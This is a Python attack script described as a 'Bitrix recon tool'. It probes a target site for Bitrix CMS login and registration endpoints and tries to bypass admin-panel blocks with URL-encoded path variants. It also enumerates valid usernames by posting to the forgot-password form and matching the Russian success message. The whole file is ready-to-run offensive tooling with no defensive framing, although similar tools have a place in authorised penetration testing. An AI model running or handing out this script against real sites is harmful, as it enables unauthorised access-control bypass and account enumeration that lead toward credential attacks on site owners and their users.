import argparse
import requests
import time
from colorama import Fore

def fuzz_dirs(base_url, dirs):
    endpoints = []
    for dir in dirs:
        time.sleep(0.5)
        url = f"{base_url}/{dir}"
        response = requests.get(url)
        if response.status_code == 200:
            endpoints.append(url)
    return endpoints

def block_bypass(dirs):
    dirs = list(map(lambda x: x.replace('bitrix', '%2e/%62%69%74%72%69%78'), dirs))
    dirs = list(map(lambda x: x.replace('admin', '%2e/%61%64%6d%69%6e'), dirs))
    return dirs

def check_block(base_url):
    if (requests.get(f"{base_url}/bitrix/tools/catalog_export/yandex_detail.php").status_code == 200) and (requests.get(f"{base_url}/bitrix/admin/").status_code == 403):
        print(Fore.YELLOW + "[!] Admin panel block detected, trying to bypass...")
        return True
    else:
        return False

def enum_users(user_list, login_endpoints):
    valid_users = []
    login_endpoint = login_endpoints[0]
    for user in user_list:
        time.sleep(0.5)
        payload = {
        'AUTH_FORM': 'Y',
        'TYPE': 'SEND_PWD',
        'USER_LOGIN': user
        }
        url = f"{login_endpoint}?forgot_password=yes"
        response = requests.post(url, data=payload)
        if "Контрольная строка, а также ваши регистрационные данные были высланы на email." in response.text:
            valid_users.append(user)

    return valid_users


def main():
    parser = argparse.ArgumentParser(description="Bitrix recon tool")
    parser.add_argument("-t", "--target", required=True, help="Base URL of the Bitrix website")
    args = parser.parse_args()
    
    base_url = args.target
    user_list = ['test', 'admin', 'bitrix', 'testtest', 'root', 'guest', 'user', 'adm', 'administrator', 'demo']
    

    login_dirs = ['bitrix/tools/catalog_export/yandex_detail.php', 
    "bitrix/admin/", 
    "bitrix/tools/autosave.php", 
    "bitrix/wizards/bitrix/demo/public_files/ru/auth/index.php",
    "bitrix/components/bitrix/map.yandex.search/settings/settings.php",
    "bitrix/tools/upload.php",
    "bitrix/components/bitrix/desktop/admin_settings.php",
    "bitrix/components/bitrix/player/player_playlist_edit.php",
    "pewpew/?SEF_APPLICATION_CUR_PAGE_URL=/bitrix/admin/",
    "pewpew/?SEF%20APPLICATION%20CUR%20PAGE_URL=/bitrix/admin/",
    "pewpew/?SEF+APPLICATION%20CUR+PAGE[URL=/bitrix/admin/",
    "bitrix/tools/sale/discount_reindex.php",
    "bitrix/tools/sale/basket_discount_convert.php",
    "auth/",
    "crm/",
    "auth/oauth2/",
    "bitrix/wizards/bitrix/demo/modules/examples/public/language/ru/examples/custom-registration/index.php",
    "bitrix/wizards/bitrix/demo/modules/examples/public/language/ru/examples/my-components/news_list.php",
    "bitrix/wizards/bitrix/demo/modules/subscribe/public/personal/subscribe/subscr_edit.php"]


    if check_block(base_url):
        login_dirs += block_bypass(login_dirs)
        blocked = True

    login_endpoints = fuzz_dirs(base_url, login_dirs)
    if login_endpoints:
        print(Fore.GREEN + "[+] Found Bitrix login endpoints:")
        for dir in login_endpoints:
            print(dir)
    else:
        if blocked:
            print(Fore.RED + "[-] Couldn't bypass admin panel block and no login endpoints found.")
        else:
            print(Fore.RED + "[-] No login endpoints found.")
    
    valid_users = enum_users(user_list, login_endpoints)

    if valid_users:
        print(Fore.GREEN + "[+] Usernames found:")
        for user in valid_users:
            print(user)
    else:
        print(Fore.RED + "[-] No usernames found.")

    register_dirs = ["bitrix/wizards/bitrix/demo/public_files/ru/auth/?register=yes",
    "auth/?register=yes",
    "crm/?register=yes",
    "auth/oauth2/?register=yes",
    "bitrix/wizards/bitrix/demo/modules/examples/public/language/ru/examples/custom-registration/index.php",
    "bitrix/wizards/bitrix/demo/modules/examples/public/language/ru/examples/my-components/news_list.php?register=yes",
    "bitrix/wizards/bitrix/demo/modules/subscribe/public/personal/subscribe/subscr_edit.php?register=YES&sf_EMAIL=",
    "bitrix/modules/bitrix.siteinfoportal/install/wizards/bitrix/infoportal/site/public/ru/personal/profile/index.php?register=yes",
    "bitrix/modules/bitrix.siteinfoportal/install/wizards/bitrix/infoportal/site/public/ru/board/my/index.php?register=yes",
    "bitrix/modules/forum/install/admin/forum_index.php",
    "bitrix/wizards/bitrix/demo/public_files/ru/auth/index.php?register=yes"
    ]
    register_endpoints = fuzz_dirs(base_url, register_dirs)
    if register_endpoints:
        print(Fore.GREEN + "[+] Found Bitrix registration endpoints:")
        for dir in register_endpoints:
            print(dir)
    else: 
        print(Fore.RED + "[-] No registration endpoints found.")

if __name__ == "__main__":
    main()
